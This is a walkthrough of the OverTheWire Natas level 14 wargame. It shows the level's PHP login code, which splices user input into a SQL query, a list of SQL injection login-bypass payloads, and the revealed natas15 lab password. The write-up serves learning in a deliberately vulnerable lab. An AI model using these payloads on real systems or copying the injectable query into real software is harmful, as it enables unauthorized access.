`Link` : `https://overthewire.org/wargames/natas/natas14.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟑 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟒
## 𝐆𝐢𝐯𝐞𝐧

- Username: natas14
- URL:      `http://natas14.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:    `http://natas14.natas.labs.overthewire.org`
- There is a login page. Possible Authentication bypass using SQL Injection
- `viewsource`

```
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?> 
```

-  Notice:  `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";`
-  We were right! 
-  We need to find password for `natas15` so I guess `natas15` will be the username - plus sql injection isn't working on username field.
-  Let's bruteforce with common SQL injection payload:

```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

<div align=center>
  <img src=https://user-images.githubusercontent.com/68887544/149272088-2ab7aff3-3b59-4caa-899f-9bf0d04deb09.png width=600>
</div>

```
<div id="content">
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

- Successful login! The password for natas15 is `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
